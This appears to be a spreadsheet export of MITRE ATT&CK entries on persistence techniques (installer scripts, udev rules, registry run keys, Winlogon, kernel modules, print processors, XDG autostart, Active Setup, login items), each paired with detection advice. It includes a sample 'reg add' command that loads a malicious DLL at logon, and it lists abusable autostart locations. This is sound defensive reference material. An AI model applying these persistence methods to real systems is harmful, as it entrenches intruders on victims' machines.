Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)
Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.
For Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. These installation routines may also include instructions to perform additional actions that may be abused by adversaries.(Citation: Microsoft Installation Procedures)</t>
  </si>
  <si>
    <t>T1546.017</t>
  </si>
  <si>
    <t>Udev Rules (T1546.017)</t>
  </si>
  <si>
    <t>File: File Modification, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may maintain persistence through executing malicious content triggered using udev rules. Udev is the Linux kernel device manager that dynamically manages device nodes, handles access to pseudo-device files in the `/dev` directory, and responds to hardware events, such as when external devices like hard drives or keyboards are plugged in or removed. Udev uses rule files with `match keys` to specify the conditions a hardware event must meet and `action keys` to define the actions that should follow. Root permissions are required to create, modify, or delete rule files located in `/etc/udev/rules.d/`, `/run/udev/rules.d/`, `/usr/lib/udev/rules.d/`, `/usr/local/lib/udev/rules.d/`, and `/lib/udev/rules.d/`. Rule priority is determined by both directory and by the digit prefix in the rule filename.(Citation: Ignacio Udev research 2024)(Citation: Elastic Linux Persistence 2024)
Adversaries may abuse the udev subsystem by adding or modifying rules in udev rule files to execute malicious content. For example, an adversary may configure a rule to execute their binary each time the pseudo-device file, such as `/dev/random`, is accessed by an application. Although udev is limited to running short tasks and is restricted by systemd-udevd's sandbox (blocking network and filesystem access), attackers may use scripting commands under the action key `RUN+=` to detach and run the malicious content’s process in the background to bypass these controls.(Citation: Reichert aon sedexp 2024)</t>
  </si>
  <si>
    <t xml:space="preserve">Monitor file creation and modification of Udev rule files in `/etc/udev/rules.d/`, `/lib/udev/rules.d/`, and /usr/lib/udev/rules.d/, specifically the `RUN` action key commands.(Citation: Ignacio Udev research 2024) </t>
  </si>
  <si>
    <t>T1547</t>
  </si>
  <si>
    <t>Command: Command Execution, Driver: Driver Load, File: File Creation, File: File Modification, Kernel: Kernel Module Load, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.
Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.</t>
  </si>
  <si>
    <t>Monitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence.(Citation: TechNet Autoruns)  Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. 
Suspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.
Monitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.
Monitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.</t>
  </si>
  <si>
    <t>T1547.001</t>
  </si>
  <si>
    <t>Registry Run Keys / Startup Folder (T1547.001)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the "run keys" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.
The following run keys are created by default on Windows systems:
* &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;
* &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;
* &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt;
* &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;
Run keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx&lt;/code&gt; is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a "Depend" key with RunOnceEx: &lt;code&gt;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\temp\evil[.]dll"&lt;/code&gt; (Citation: Oddvar Moe RunOnceEx Mar 2018)
Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is &lt;code&gt;C:\Users\\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup&lt;/code&gt;. The startup folder path for all users is &lt;code&gt;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp&lt;/code&gt;.
The following Registry keys can be used to set startup folder items for persistence:
* &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&lt;/code&gt;
* &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&lt;/code&gt;
* &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders&lt;/code&gt;
* &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders&lt;/code&gt;
The following Registry keys can control automatic startup of services during boot:
* &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&lt;/code&gt;
* &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce&lt;/code&gt;
* &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices&lt;/code&gt;
* &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices&lt;/code&gt;
Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:
* &lt;code&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt;
* &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt;
Programs listed in the load value of the registry key &lt;code&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows&lt;/code&gt; run automatically for the currently logged-on user.
By default, the multistring &lt;code&gt;BootExecute&lt;/code&gt; value of the registry key &lt;code&gt;HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager&lt;/code&gt; is set to &lt;code&gt;autocheck autochk *&lt;/code&gt;. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.
Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.</t>
  </si>
  <si>
    <t>Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders. (Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.
Changes to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.</t>
  </si>
  <si>
    <t>T1547.002</t>
  </si>
  <si>
    <t>Authentication Package (T1547.002)</t>
  </si>
  <si>
    <t>Command: Command Execution, Module: Module Load, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)
Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\Lsa\&lt;/code&gt; with the key value of &lt;code&gt;"Authentication Packages"=&amp;lt;target binary&amp;gt;&lt;/code&gt;. The binary will then be executed by the system when the authentication packages are loaded.</t>
  </si>
  <si>
    <t>Monitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key &lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe&lt;/code&gt; with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)</t>
  </si>
  <si>
    <t>T1547.003</t>
  </si>
  <si>
    <t>Time Providers (T1547.003)</t>
  </si>
  <si>
    <t>Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)
Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)
Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017)</t>
  </si>
  <si>
    <t>Baseline values and monitor/analyze activity related to modifying W32Time information in the Registry, including application programming interface (API) calls such as &lt;code&gt;RegCreateKeyEx&lt;/code&gt; and &lt;code&gt;RegSetValueEx&lt;/code&gt; as well as execution of the W32tm.exe utility.(Citation: Microsoft W32Time May 2017) There is no restriction on the number of custom time providers registrations, though each may require a DLL payload written to disk.(Citation: Github W32Time Oct 2017)
The Sysinternals Autoruns tool may also be used to analyze auto-starting locations, including DLLs listed as time providers.(Citation: TechNet Autoruns)</t>
  </si>
  <si>
    <t>T1547.004</t>
  </si>
  <si>
    <t>Winlogon Helper DLL (T1547.004)</t>
  </si>
  <si>
    <t>Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in. Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete. Registry entries in &lt;code&gt;HKLM\Software[\\Wow6432Node\\]\Microsoft\Windows NT\CurrentVersion\Winlogon\&lt;/code&gt; and &lt;code&gt;HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\&lt;/code&gt; are used to manage additional helper programs and functionalities that support Winlogon.(Citation: Cylance Reg Persistence Sept 2013) 
Malicious modifications to these Registry keys may cause Winlogon to load and execute malicious DLLs and/or executables. Specifically, the following subkeys have been known to be possibly vulnerable to abuse: (Citation: Cylance Reg Persistence Sept 2013)
* Winlogon\Notify - points to notification package DLLs that handle Winlogon events
* Winlogon\Userinit - points to userinit.exe, the user initialization program executed when a user logs on
* Winlogon\Shell - points to explorer.exe, the system shell executed when a user logs on
Adversaries may take advantage of these features to repeatedly execute malicious code and establish persistence.</t>
  </si>
  <si>
    <t>Monitor for changes to Registry entries associated with Winlogon that do not correlate with known software, patch cycles, etc. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current Winlogon helper values. (Citation: TechNet Autoruns)  New DLLs written to System32 that do not correlate with known good software or patching may also be suspicious.
Look for abnormal process behavior that may be due to a process loading a malicious DLL. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.</t>
  </si>
  <si>
    <t>T1547.005</t>
  </si>
  <si>
    <t>Security Support Provider (T1547.005)</t>
  </si>
  <si>
    <t>Adversaries may abuse security support providers (SSPs) to execute DLLs when the system boots. Windows SSP DLLs are loaded into the Local Security Authority (LSA)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t>
  </si>
  <si>
    <t>Monitor the Registry for changes to the SSP Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned SSP DLLs try to load into the LSA by setting the Registry key &lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\LSASS.exe&lt;/code&gt; with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)</t>
  </si>
  <si>
    <t>T1547.006</t>
  </si>
  <si>
    <t>Kernel Modules and Extensions (T1547.006)</t>
  </si>
  <si>
    <t>Command: Command Execution, File: File Creation, File: File Modification, Kernel: Kernel Module Load, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) 
When used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)
Kernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through &lt;code&gt;kextload&lt;/code&gt; and &lt;code&gt;kextunload&lt;/code&gt; commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)
Since macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as "Legacy System Extensions" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)
Adversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)</t>
  </si>
  <si>
    <t xml:space="preserve">Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands: &lt;code&gt;modprobe&lt;/code&gt;, &lt;code&gt;insmod&lt;/code&gt;, &lt;code&gt;lsmod&lt;/code&gt;, &lt;code&gt;rmmod&lt;/code&gt;, or &lt;code&gt;modinfo&lt;/code&gt; (Citation: Linux Loadable Kernel Module Insert and Remove LKMs) LKMs are typically loaded into &lt;code&gt;/lib/modules&lt;/code&gt; and have had the extension .ko ("kernel object") since version 2.6 of the Linux kernel. (Citation: Wikipedia Loadable Kernel Module)
Adversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled. (Citation: iDefense Rootkit Overview) Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.(Citation: Trend Micro Skidmap) Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: &lt;code&gt;apt-get install linux-headers-$(uname -r)&lt;/code&gt; On RHEL and CentOS based systems this can be accomplished by running: &lt;code&gt;yum install kernel-devel-$(uname -r)&lt;/code&gt;
On macOS, monitor for execution of &lt;code&gt;kextload&lt;/code&gt; commands and user installed kernel extensions performing abnormal and/or potentially malicious activity (such as creating network connections). Monitor for new rows added in the &lt;code&gt;kext_policy&lt;/code&gt; table. KextPolicy stores a list of user approved (non Apple) kernel extensions and a partial history of loaded kernel modules in a SQLite database, &lt;code&gt;/var/db/SystemPolicyConfiguration/KextPolicy&lt;/code&gt;.(Citation: User Approved Kernel Extension Pike’s)(Citation: Purves Kextpocalypse 2)(Citation: Apple Developer Configuration Profile)
</t>
  </si>
  <si>
    <t>T1547.007</t>
  </si>
  <si>
    <t>Re-opened Applications (T1547.007)</t>
  </si>
  <si>
    <t>Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to "Reopen windows when logging back in".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named &lt;code&gt;com.apple.loginwindow.[UUID].plist&lt;/code&gt; within the &lt;code&gt;~/Library/Preferences/ByHost&lt;/code&gt; directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user’s next logon.
Adversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the &lt;code&gt;com.apple.loginwindow.[UUID].plist&lt;/code&gt; file to execute payloads when a user logs in.</t>
  </si>
  <si>
    <t>Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.</t>
  </si>
  <si>
    <t>T1547.008</t>
  </si>
  <si>
    <t>LSASS Driver (T1547.008)</t>
  </si>
  <si>
    <t>Driver: Driver Load, File: File Creation, File: File Modification, Module: Module Load</t>
  </si>
  <si>
    <t>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Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)
Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.</t>
  </si>
  <si>
    <t xml:space="preserve">With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014) Also monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)
Utilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA. </t>
  </si>
  <si>
    <t>T1547.009</t>
  </si>
  <si>
    <t>Shortcut Modification (T1547.009)</t>
  </si>
  <si>
    <t>File: File Creation, File: File Modification, Process: Process Creation</t>
  </si>
  <si>
    <t>Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.
Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program.
Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176)) to persistently launch malware.</t>
  </si>
  <si>
    <t>Since a shortcut's target path likely will not change, modifications to shortcut files that do not correlate with known software changes, patches, removal, etc., may be suspicious. Analysis should attempt to relate shortcut file change or creation events to other potentially suspicious events based on known adversary behavior such as process launches of unknown executables that make network connections.
Monitor for LNK files created with a Zone Identifier value greater than 1, which may indicate that the LNK file originated from outside of the network.(Citation: BSidesSLC 2020 - LNK Elastic)</t>
  </si>
  <si>
    <t>T1547.010</t>
  </si>
  <si>
    <t>Port Monitors (T1547.010)</t>
  </si>
  <si>
    <t>File: File Creation, Module: Module Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t xml:space="preserve">Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the &lt;code&gt;AddMonitor&lt;/code&gt; API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in &lt;code&gt;C:\Windows\System32&lt;/code&gt; and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham) 
Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors&lt;/code&gt;. The Registry key contains entries for the following:
* Local Port
* Standard TCP/IP Port
* USB Monitor
* WSD Port
</t>
  </si>
  <si>
    <t>Monitor process API calls to &lt;code&gt;AddMonitor&lt;/code&gt;.(Citation: AddMonitor) Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. 
Monitor Registry writes to &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors&lt;/code&gt;, paying particular attention to changes in the "Driver" subkey. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism.(Citation: TechNet Autoruns)</t>
  </si>
  <si>
    <t>T1547.012</t>
  </si>
  <si>
    <t>Driver: Driver Load, File: File Creation, Module: Module Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)
Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the &lt;code&gt;AddPrintProcessor&lt;/code&gt; API call with an account that has &lt;code&gt;SeLoadDriverPrivilege&lt;/code&gt; enabled. Alternatively, a print processor can be registered to the print spooler service by adding the &lt;code&gt;HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver&lt;/code&gt; Registry key that points to the DLL.
For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the &lt;code&gt;GetPrintProcessorDirectory&lt;/code&gt; API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)
The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.</t>
  </si>
  <si>
    <t>Monitor process API calls to &lt;code&gt;AddPrintProcessor&lt;/code&gt; and &lt;code&gt;GetPrintProcessorDirectory&lt;/code&gt;. New print processor DLLs are written to the print processor directory. Also monitor Registry writes to &lt;code&gt;HKLM\SYSTEM\ControlSet001\Control\Print\Environments\\[Windows architecture]\Print Processors\\[user defined]\\Driver&lt;/code&gt; or &lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\\[Windows architecture]\Print Processors\\[user defined]\Driver&lt;/code&gt; as they pertain to print processor installations.
Monitor for abnormal DLLs that are loaded by spoolsv.exe. Print processors that do not correlate with known good software or patching may be suspicious.</t>
  </si>
  <si>
    <t>T1547.013</t>
  </si>
  <si>
    <t>XDG Autostart Entries (T1547.013)</t>
  </si>
  <si>
    <t>Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.(Citation: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys)
Adversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user’s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory.
Adversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.(Citation: Red Canary Netwire Linux 2022)</t>
  </si>
  <si>
    <t>Malicious XDG autostart entries may be detected by auditing file creation and modification events within the &lt;code&gt;/etc/xdg/autostart&lt;/code&gt; and &lt;code&gt;~/.config/autostart&lt;/code&gt; directories. Depending on individual configurations, defenders may need to query the environment variables &lt;code&gt;$XDG_CONFIG_HOME&lt;/code&gt; or &lt;code&gt;$XDG_CONFIG_DIRS&lt;/code&gt; to determine the paths of Autostart entries. Autostart entry files not associated with legitimate packages may be considered suspicious. Suspicious entries can also be identified by comparing entries to a trusted system baseline.
Suspicious processes or scripts spawned in this manner will have a parent process of the desktop component implementing the XDG specification and will execute as the logged on user.</t>
  </si>
  <si>
    <t>T1547.014</t>
  </si>
  <si>
    <t>Active Setup (T1547.014)</t>
  </si>
  <si>
    <t>Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification</t>
  </si>
  <si>
    <t>Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.
Adversaries may abuse Active Setup by creating a key under &lt;code&gt; HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\&lt;/code&gt; and setting a malicious value for &lt;code&gt;StubPath&lt;/code&gt;. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)
Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.</t>
  </si>
  <si>
    <t>Monitor Registry key additions and/or modifications to &lt;code&gt;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Active Setup\Installed Components\&lt;/code&gt;.
Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders.(Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.</t>
  </si>
  <si>
    <t>T1547.015</t>
  </si>
  <si>
    <t>Login Items (T1547.015)</t>
  </si>
  <si>
    <t>Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call &lt;code&gt;SMLoginItemSetEnabled&lt;/code&gt;.
Login items installed using the Service Management Framework leverage &lt;code&gt;launchd&lt;/code&gt;, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.
